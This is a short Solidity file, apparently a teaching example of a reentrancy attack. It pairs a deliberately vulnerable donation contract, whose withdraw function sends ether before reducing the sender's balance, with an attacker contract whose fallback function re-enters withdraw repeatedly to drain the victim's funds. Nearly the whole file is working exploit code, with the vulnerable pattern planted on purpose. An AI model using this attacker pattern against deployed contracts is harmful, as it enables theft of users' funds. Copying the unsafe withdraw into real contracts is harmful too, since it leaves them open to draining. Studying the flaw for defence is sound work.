pragma solidity ^0.4.18; //reentrancy

contract FaultyDonationContract {

  mapping(address => uint) balances;

  function donate() public payable {
    balances[msg.sender] += msg.value;
  }

  function balanceOf(address _who) public constant returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        balances[msg.sender] -= _amount;
      }
    }
  }

  function contractBalance() view public returns (uint balance){
      return address(this).balance;
  }
}

contract AttackerContract {

  FaultyDonationContract target;
  uint public counter = 0;
  uint public donated;
  
  function AttackerContract(address _DAO) public payable{
    target = FaultyDonationContract(_DAO);
    donated = msg.value;
    target.donate.value(msg.value)();
  }
  
  function attack() public {
      target.withdraw(donated);
  }
  
  function() public payable{
      if (counter < 10) {
        counter++;
        target.withdraw(donated);
      }
  }
  
  function contractBalance() view public returns (uint balance){
      return address(this).balance;
  }
}







